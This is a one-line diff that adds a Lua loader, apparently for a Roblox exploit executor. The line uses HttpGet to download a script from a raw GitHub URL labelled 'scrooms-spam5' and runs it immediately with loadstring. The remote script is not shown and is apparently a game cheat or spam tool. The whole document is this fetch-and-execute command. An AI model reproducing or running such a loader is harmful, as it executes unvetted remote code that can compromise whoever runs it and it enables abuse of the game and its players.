@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/scrooms-spam5-4j297wmkl5u0y0.lua"))()
